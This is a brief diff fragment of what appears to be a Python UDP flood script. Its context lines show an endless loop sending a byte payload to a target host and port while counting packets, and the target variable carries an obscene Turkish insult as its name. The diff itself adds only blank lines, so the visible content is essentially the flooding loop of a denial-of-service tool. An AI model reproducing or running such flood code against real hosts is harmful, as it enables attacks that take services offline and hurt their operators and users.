@@ -18,3 +18,14 @@ paket=0
 while True:
     s.sendto(bitler,(orospuevladi,port))
     paket+=1
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
